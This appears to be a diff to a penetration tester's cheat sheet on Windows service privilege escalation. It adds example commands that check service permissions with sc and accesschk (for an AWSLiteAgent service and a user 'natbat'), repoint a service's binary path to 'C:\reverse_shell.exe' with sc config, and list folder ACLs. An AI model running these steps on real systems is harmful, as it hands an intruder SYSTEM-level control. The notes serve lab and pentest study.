@@ -4,7 +4,7 @@
 
 # Get service informatoin(about permission included)
     sc qc <service_name>
-
+    sc qc AWSLiteAgent
 
 ## Service need be runned with SYSTEM rights
     SERVICE_START_NAME : LocalSystem
@@ -13,21 +13,25 @@ ____________________________________________________________________________
 
 # Check <username> permisson on <service_name>
     accesschk.exe /accepteula -uwcqv <username> <service_name>
+    accesschk.exe /accepteula -uwcqv natbat AWSLiteAgent
+    accesschk.exe /accepteula -uwcqv AWSLiteAgent
 
 ## User or user group required permission: SERVICE_CHANGE_CONFIG
 
 ## Modify the service config and set the BINARY_PATH_NAME
+    sc config <service_name> binpath= "\"C:\reverse_shell.exe\""
     sc config daclsvc binpath= "\"C:\reverse_shell.exe\""
 ____________________________________________________________________________
 
 
 # Check currend user permisson on <service_foldef_path>
-    accesschk.exe /accepteula -uwdq
-"C:\<service_foldef_path>\<bin_folder_name>\"
+    accesschk.exe /accepteula -uwdq "C:\<service_foldef_path>\<bin_folder_name>\"
 
 #    or
 
     powershell "get-acl -Path 'C:\<service_foldef_path>' | format-list"
+
+    powershell "get-acl -Path 'C:\Program Files' | format-list"
 
 ## Service bin_folder_name is unquoted and contains spaces.
 
